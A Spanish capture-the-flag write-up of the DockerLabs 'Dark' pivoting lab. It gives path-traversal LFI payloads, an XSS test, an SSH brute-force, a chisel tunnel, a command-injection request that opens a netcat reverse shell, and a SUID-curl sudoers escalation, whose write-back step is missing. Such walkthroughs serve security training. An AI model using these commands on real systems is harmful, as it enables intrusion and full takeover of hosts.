---
title: DockerLabs - Dark
summary: "Write-up del laboratorio Dark de DockerLabs"
author: elcybercurioso
date: 2026-02-03 12:54:11
categories: [Post, DockerLabs]
tags: []
media_subpath: "/assets/img/posts/dockerlabs_dark"
image:
  path: main.webp
---

Para desplegar las máquinas, se haría de la siguiente manera:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Dark/docker]
└─$ sudo ./auto_deploy.sh dark1.tar dark2.tar 

                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____ 
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__  
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___] 
                                         
                                     
Creando red pivoting1 con subred 10.10.10.0/24 y puerta de enlace 10.10.10.1
La red pivoting1 ha sido creada exitosamente con la subred 10.10.10.0/24.
Creando red pivoting2 con subred 20.20.20.0/24 y puerta de enlace 20.20.20.1
La red pivoting2 ha sido creada exitosamente con la subred 20.20.20.0/24.

Estamos desplegando la máquina vulnerable del archivo dark1.tar, espere un momento.

Máquina desplegada desde dark1.tar, sus direcciones IP son --> 10.10.10.2 20.20.20.2

Estamos desplegando la máquina vulnerable del archivo dark2.tar, espere un momento.

Máquina desplegada desde dark2.tar, sus direcciones IP son --> 20.20.20.3
```

Estructura de red:

![Desktop View](/20260202192037.webp){: width="972" height="589" .shadow}

## nmap

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Dark]
└─$ nmap -p- -sS --min-rate 5000 -n -Pn 10.10.10.2
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Dark]
└─$ nmap -sCV -p22,80 10.10.10.2                  
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 3f:52:53:45:8b:99:34:47:19:12:64:d1:f4:d4:23:b9 (ECDSA)
|_  256 c5:04:3d:16:6b:71:f6:a0:74:92:74:9c:a3:7a:80:57 (ED25519)
80/tcp open  http    Apache httpd 2.4.59 ((Debian))
|_http-server-header: Apache/2.4.59 (Debian)
|_http-title: darkweb
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## [máquina A] análisis

Comenzamos revisando la página web alojada en la máquina A, donde vemos un formulario con un campo que acepta URLs:

![Desktop View](/20260128170417.webp){: width="450" height="210" .shadow}

Siendo este el caso, lo que podemos hacer es desplegar un servidor local, y hacer pruebas con ficheros de nuestro equipo:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Dark]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
```

Probamos a ver si nos manda peticiones:

![Desktop View](/20260128171014.webp){: width="450" height="210" .shadow}

Vemos que efectivamente recibimos las peticiones que hace la máquina A:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Dark]
└─$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.10.2 - - [XX/XXX/XXXX XX:XX:XX] code 404, message File not found
10.10.10.2 - - [XX/XXX/XXXX XX:XX:XX] "GET /test.txt HTTP/1.1" 404 -
```

Siendo este el caso, creamos un fichero `index.html` e indicamos código en HTML para ver si se llega a interpretar:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Dark]
└─$ cat index.html 
<h1>Hola</h1>
```

Y resulta ser que sí:

![Desktop View](/20260128171308.webp){: width="450" height="210" .shadow}

De la misma manera, si interpreta HTML, también podría ser vulnerable a XSS:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Dark]
└─$ cat index.html 
<html>
<head>
</head>
<body>
        <script>alert(1);</script>
</body>
</html>
```

Y confirmamos que así es:

![Desktop View](/20260128172423.webp){: width="600" height="420" .shadow}

Probamos a ver si el formulario es vulnerable a un **LFI** (Local File Inclusion, cargar ficheros del sistema) empleando un **Directory Path Traversal** (moverse lateralmente en el sistema antes de cargar un fichero):

```bash
../../../../../../../etc/passwd
```

![Desktop View](/20260128192558.webp){: width="450" height="210" .shadow}

Vemos que logramos cargar el fichero `/etc/passwd` del sistema:

![Desktop View](/20260128192626.webp){: width="972" height="589" .shadow}

Otro fichero que podemos cargar es el propio script que se ejecuta al enviar el formulario de la página principal:

```bash
../../../../../../../var/www/html/process.php
```

Vemos que carga, pero vemos que se comentan los bloques de PHP automáticamente:

![Desktop View](/20260128192845.webp){: width="972" height="589" .shadow}

Como no vemos nada destacable a simple vista, tratamos de encontrar por fuerza bruta otros ficheros en el sistema empleando **wfuzz**:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Dark]
└─$ wfuzz -c -t 200 --hw=0 --hh=0 -X POST -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u "http://10.10.10.2/process.php" -d "url=../../../../../../..FUZZ"
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz`s documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.2/process.php
Total requests: 929

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                                          
=====================================================================

000000121:   200        225 L    1107 W     7178 Ch     "/etc/apache2/apache2.conf"
000000246:   200        7 L      40 W       286 Ch      "/etc/motd"
000000249:   200        19 L     103 W      767 Ch      "/etc/netconfig"                                                                                                                                 
000000250:   200        20 L     65 W       526 Ch      "/etc/nsswitch.conf"
000000257:   200        23 L     29 W       1129 Ch     "/etc/passwd"
000000236:   200        353 L    1042 W     8139 Ch     "/etc/init.d/apache2"                                                                                                                            
000000237:   200        2 L      5 W        27 Ch       "/etc/issue"                                                                                                                                     
000000422:   200        122 L    387 W      3223 Ch     "/etc/ssh/sshd_config"                                                                                                                              
000000399:   200        11 L     47 W       305 Ch      "/etc/resolv.conf"                                                                                                                               
000000400:   200        41 L     120 W      911 Ch      "/etc/rpc"                                                                                                                                       
000000138:   200        45 L     45 W       567 Ch      "/etc/group"                                                                                                                                     
000000135:   200        1 L      6 W        37 Ch       "/etc/fstab"                                                                                                                                     
000000497:   200        224 L    1592 W     9464 Ch     "/proc/cpuinfo"                                                                                                                                  
000000498:   200        66 L     832 W      8770 Ch     "/proc/interrupts"                                                                                                                               
000000499:   200        1 L      5 W        26 Ch       "/proc/loadavg"                                                                                                                                  
000000500:   200        55 L     161 W      1531 Ch     "/proc/meminfo"                                                                                                                                  
000000507:   200        0 L      1 W        27 Ch       "/proc/self/cmdline"                                                                                                                             
000000503:   200        5 L      71 W       569 Ch      "/proc/net/dev"                                                                                                                                  
000000501:   200        22 L     132 W      1893 Ch     "/proc/mounts"                                                                                                                                   
000000699:   200        0 L      1 W        292292 Ch   "/var/log/lastlog"                                                                                                                               
000000741:   200        7 L      7 W        1535 Ch     "/var/log/wtmp"
000000209:   200        17 L     111 W      711 Ch      "/etc/hosts.deny"                                                                                                                                
000000208:   200        10 L     57 W       411 Ch      "/etc/hosts.allow"
000000205:   200        8 L      18 W       198 Ch      "/etc/hosts"                                                                                                                                     
000000510:   200        1 L      21 W       197 Ch      "/proc/version"                                                                                                                                  
000000509:   200        61 L     144 W      1491 Ch     "/proc/self/status"                                                                                                                              
000000506:   200        10 L     36 W       266 Ch      "/proc/partitions"                                                                                                                               
000000505:   200        227 L    3504 W     34050 Ch    "/proc/net/tcp"                                                                                                                                  
000000504:   200        4 L      44 W       512 Ch      "/proc/net/route"                                                                                                                                
000000502:   200        2 L      15 W       156 Ch      "/proc/net/arp"                                                                                                                                  

Total time: 0
Processed Requests: 929
Filtered Requests: 870
Requests/sec.: 0
```

Sin embargo, ninguno de estos fichero contiene nada que nos dé una pista de como acceder al sistema.

## [máquina A] acceso inicial (toni)

Mientras seguimos revisando posibles maneras de acceder al sistema, podemos tratar de encontrar la contraseña del usuario `toni` (el cual vimos al cargar el fichero `/etc/passwd`) de SSH empleando fuerza bruta con herramientas como **hydra**.

Lanzamos **hydra**, y pasado un rato, nos encuentra la contraseña:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Dark]
└─$ hydra -l toni -P /usr/share/seclists/Passwords/rockyou.txt ssh://10.10.10.2 -t 64 -I
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra)
[DATA] max 64 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~224132 tries per task
[DATA] attacking ssh://10.10.10.2:22/
[22][ssh] host: 10.10.10.2   login: toni   password: ******
1 of 1 target successfully completed, 1 valid password found
```

Teniendo las credenciales, accedemos a la máquina A por SSH:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Dark]
└─$ ssh toni@10.10.10.2
toni@10.10.10.2`s password: 
toni@d61770eaef6e:~$ whoami
toni
toni@d61770eaef6e:~$ hostname -I
10.10.10.2 20.20.20.2
```

## [máquina B] análisis

Para analizar posibles vectores de escalada de privilegios, optaremos por usar la herramienta [**LinPEAS**](https://github.com/peass-ng/PEASS-ng/tree/master).

Dado que la máquina no cuenta con la utilidad `wget` pero sí que tiene **netcat**, la usaremos para este propósito, donde lo primero es poner en escucha en la máquina A la herramienta **nc** de la siguiente manera:

```bash
toni@d61770eaef6e:~$ nc -lp 5555 > linpeas.sh
```

Lo siguiente es enviar el script desde nuestra máquina, que también lo haremos con **nc**:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Dark]
└─$ nc -w 3 10.10.10.2 5555 < linpeas.sh
```

Una vez se haya finalizado, podemos comprobar que se ha enviado de forma correcta generando un hash con la utilidad `md5sum`:

```bash
toni@d61770eaef6e:~$ md5sum linpeas.sh 
fc112e55539511726c4c6803364596cd  linpeas.sh
```

Si el hash generado en la máquina A coincide con el que obtenemos en nuestra máquina, podemos confirmar que se ha enviado el fichero de forma correcta:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Dark]
└─$ md5sum linpeas.sh              
fc112e55539511726c4c6803364596cd  linpeas.sh
```

Antes de ejecutar **LinPEAS**, debemos darle permisos de ejecución:

```bash
toni@d61770eaef6e:~$ chmod +x linpeas.sh
```

Tras ejecutar el script, encontramos que existe el fichero `info` en el directorio `/var/www/html`, cuyo contenido va dirigido al usuario con el que estamos conectados (`toni`), e indica que en la máquina con IP `20.20.20.3` hay una página desplegada:

```bash
toni@d61770eaef6e:~$ cat /var/www/html/info
Toni te recuerdo que he publicado las bases de datos de telefonica,la dgt y el banco santander en mi pagina ilegal (20.20.20.3)
```

Dado que sabemos cual es la IP de la máquina B que está en el segmento `20.20.20.0/24`, podemos emplear el siguiente script para listar los puertos abiertos:

```bash
toni@d61770eaef6e:~$ cat portDiscovery.sh 
for port in $(seq 1 10000); do
  nc -z -w 1 20.20.20.3 $port && echo "Port $port is open"
done
```

Le damos permisos de ejecución al script:

```bash
toni@d61770eaef6e:~$ chmod +x portDiscovery.sh
```

Lo ejecutamos, y vemos que nos indica que tiene los puertos 22 y 80 abiertos:

```bash
toni@d61770eaef6e:~$ ./portDiscovery.sh 
Port 22 is open
Port 80 is open
```

## [máquina B] privoting (www-data)

Para traernos el puerto 80 de la máquina B a nuestra máquina usaremos [**chisel**](https://github.com/jpillora/chisel), el cual transferiremos a la máquina A usando la utilidad `scp`, ya que tenemos credenciales de SSH válidas:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Dark]
└─$ scp chisel toni@10.10.10.2:/tmp
toni@10.10.10.2`s password: 
chisel                                                                                                                                                                          100%   10MB  11.9MB/s   00:00
```

Si ahora nos vamos a la máquina A, veremos que el binario de **chisel** se encuentra en la carpeta `/tmp`:

```bash
toni@d61770eaef6e:~$ ls -la /tmp
total 10012
drwxrwxrwt 1 root root     4096 XXX XX XX:XX .
drwxr-xr-x 1 root root     4096 XXX XX XX:XX ..
-rwxr-xr-x 1 toni toni 10240184 XXX XX XX:XX chisel
```

Le daremos permisos de ejecución:

```bash
toni@d61770eaef6e:~$ chmod +x /tmp/chisel
```

En nuestro equipo desplegaremos **chisel** en modo servidor:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Dark]
└─$ ./chisel server --reverse -p 1234
XXXX/XX/XX XX:XX:XX server: Reverse tunnelling enabled
XXXX/XX/XX XX:XX:XX server: Fingerprint EtYjnlbRAQz9YbI7gSc2mFMLnfojIPP025jYyAN1Zqg=
XXXX/XX/XX XX:XX:XX server: Listening on http://0.0.0.0:1234
```

Ejecutamos **chisel** en la máquina A en modo cliente para crear un proxy **SOCKS5**, el cual permitirá que desde nuestra máquina podamos acceder a la máquina B (empleando la máquina A como puente):

```bash
toni@d61770eaef6e:/tmp$ ./chisel client 10.10.10.1:1234 R:socks
XXXX/XX/XX XX:XX:XX client: Connecting to ws://10.10.10.1:1234
XXXX/XX/XX XX:XX:XX client: Connected (Latency 1.619467ms)
```

Será necesario modificar el fichero de configuración `/etc/proxychains4.conf` en nuestro equipo, ya que **chisel** abre el proxy por el puerto 1080 de nuestra máquina, por lo que deberá quedar de la siguiente manera:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Dark]
└─$ tail -n 3 /etc/proxychains4.conf
# defaults set to "tor"
socks5  127.0.0.1 1080
```

Si ahora tratamos de acceder a la máquina B desde la nuestra, pero empleando `proxychains`, veremos que ya llegamos:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Dark]
└─$ proxychains4 curl 20.20.20.3     
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  20.20.20.3:80  ...  OK
<!DOCTYPE html>
<html>
<head>
    <title></title>
</head>
<body>
    <h1>webilegal.com</h1>
    <form action="http://20.20.20.3/process.php" method="post">
        <label for="cmd">Busca un producto ilegal</label><br>
        <input type="text" id="cmd" name="cmd"><br>
        <input type="submit" value="Enviar">
    </form>
</body>
</html>
```

Para poder acceder desde el navegador, necesitaremos una extensión como, por ejemplo, **FoxyProxy** para poder configurar fácilmente proxies.

Crearemos un nuevo perfil para el proxy que se abre con **chisel**:
- Tipo: SOCKS5
- Host: 127.0.0.1
- Puerto: 1080

![Desktop View](/20260128232015.webp){: width="972" height="589" .shadow}

Una vez configurado, seleccionamos el perfil que acabamos de crear:

![Desktop View](/20260128231924.webp){: width="550" height="290" .shadow}

Si ahora accedemos a la máquina B, veremos que nos carga la página:

![Desktop View](/20260128231901.webp){: width="450" height="210" .shadow}

En el fichero `.bash_history` de la máquina A encontramos una serie de comandos que explota un **RCE** (Remote Code Execution) para obtener una consola:

```bash
toni@d61770eaef6e:~$ cat /home/toni/.bash_history
...
nc -nlvp 53
clear
curl --data "cmd=nc -e /bin/bash 20.20.20.2 53" http://20.20.20.3/process.php
```

Accedemos a la página web de la máquina B, indicamos un comando en el campo del formulario y probamos a ver si es verdad que podemos ejecutar comandos:

![Desktop View](/20260128232442.webp){: width="450" height="210" .shadow}

Y vemos que efectivamente podemos ejecutar comandos:

![Desktop View](/20260128232520.webp){: width="972" height="589" .shadow}

Nos ponemos en escucha en la máquina A con **nc**:

```bash
toni@d61770eaef6e:~$ nc -nlvp 4444
listening on [any] 4444 ...
```

Ejecutamos el comando que nos indicaban en el fichero `.bash_history` en otra consola, o en la página web:

```bash
toni@d61770eaef6e:~$ curl --data "cmd=nc -e /bin/bash 20.20.20.2 4444" http://20.20.20.3/process.php
```

Si volvemos a la consola donde estamos en escucha, habremos obtenido la consola remota en la máquina B desde la máquina A:

```bash
connect to [20.20.20.2] from (UNKNOWN) [20.20.20.3] 60384
whoami
www-data
hostname -I
20.20.20.3
```

Para poder operar con mayor facilidad, procedemos a tratar la TTY:

```bash
script -c bash /dev/null
Script started, output log file is '/dev/null'.
www-data@111bb84cbd16:/var/www/html$ ^Z
[1]+  Stopped                 nc -nlvp 4444
toni@d61770eaef6e:~$ stty raw -echo;fg
nc -nlvp 4444
             reset xterm

www-data@111bb84cbd16:/var/www/html$ export TERM=xterm
www-data@111bb84cbd16:/var/www/html$ export SHELL=bash
www-data@111bb84cbd16:/var/www/html$ stty rows 45 columns 210
```

Revisamos los usuarios del sistema que tengan una consola asignada en el fichero `/etc/passwd`, donde vemos únicamente al usuario `root`:

```bash
www-data@111bb84cbd16:/var/www/html$ cat /etc/passwd | grep sh$
root:x:0:0:root:/root:/bin/bash
```

## [máquina B] escalada de privilegios (root)

Listaremos los binarios que tengan permisos **SUID** (permiten ejecutar el binario con permisos del propietario), donde destaca `/usr/bin/curl`:

```bash
www-data@111bb84cbd16:/var/www/html$ find / -perm -4000 2>/dev/null
/usr/bin/newgrp
/usr/bin/su
/usr/bin/umount
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/mount
/usr/bin/chsh
/usr/bin/curl
/usr/bin/sudo
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

En [GTFOBins](https://gtfobins.org/gtfobins/curl/#file-write) nos indican que podemos aprovecharnos de estos permisos sobre el binario `curl` para escribir en ficheros con permisos elevados:

![Desktop View](/20260128212108.webp){: width="972" height="589" .shadow}

Existen múltiples maneras de escalar privilegios con estas premisas, pero en mi caso optaré por agregar al usuario `www-data` al fichero `/etc/sudoers` para darle permisos elevados dentro del sistema.

Para conseguirlo, lo primero es obtener una copia del fichero `/etc/sudoers` y guardarla en una carpeta en la que tengamos permisos de escritura y lectura, como, por ejemplo, la carpeta `/tmp`:

```bash
www-data@111bb84cbd16:/tmp$ curl file:///etc/sudoers -o /tmp/sudoers
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  1714  100  1714    0     0  4082k      0 --:--:-- --:--:-- --:--:-- 4082k
www-data@111bb84cbd16:/tmp$ ls -la
total 12
drwxrwxrwt 1 root root     4096 XXX XX XX:XX .
drwxr-xr-x 1 root root     4096 XXX XX XX:XX ..
-rw-r--r-- 1 root www-data 1714 XXX XX XX:XX sudoers
```

Dado que los permisos de la copia del fichero `/etc/sudoers` sigue sin dejarnos modificarla (únicamente nos permite leerlo), lo que podemos hacer es copiar su contenido a otro fichero, sobre el cual ya tendríamos permisos como propietario:

```bash
www-data@111bb84cbd16:/tmp$ cat ./sudoers > test.txt
```

Sobre este nuevo fichero ya podremos hacer las modificaciones pertinentes, que sería agregar una nueva línea que indique que el usuario `www-data` tiene permisos de administrador:

```bash
www-data@111bb84cbd16:/tmp$ echo "www-data ALL=(ALL:ALL) NOPASSWD: ALL" >> ./test.txt 
www-data@111bb84cbd16:/tmp$ tail -n 3 test.txt 

@includedir /etc/sudoers.d
www-data ALL=(ALL:ALL) NOPASSWD: ALL
```

Si ahora revisamos los permisos SUDO del usuario `www-data`, veremos que tiene permisos de administrador en el sistema:

```bash
www-data@111bb84cbd16:/tmp$ sudo -l
Matching Defaults entries for www-data on 111bb84cbd16:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User www-data may run the following commands on 111bb84cbd16:
    (ALL : ALL) NOPASSWD: ALL
```

Podemos invocar una consola como el usuario `root` sin aportar contraseña de la siguiente manera:

```bash
www-data@111bb84cbd16:/tmp$ sudo su
root@111bb84cbd16:/tmp# whoami
root
```

<a href="https://www.buymeacoffee.com/elcybercurioso" target="_blank"><img src="https://img.buymeacoffee.com/button-api/?text=Buy+me+a+coffee&emoji=&slug=elcybercurioso&button_colour=FFDD00&font_colour=000000&font_family=Cookie&outline_colour=000000&coffee_colour=ffffff" alt="buymecoffee_icon" /></a>

<script data-name="BMC-Widget" data-cfasync="false" src="https://cdnjs.buymeacoffee.com/1.0.0/widget.prod.min.js" data-id="zweilosec" data-description="Support me on Buy me a coffee!" data-message="Gracias por tu visita! Un café me da las fuerzas para continuar!" data-color="#FFDD00" data-position="Right" data-x_margin="18" data-y_margin="18"></script>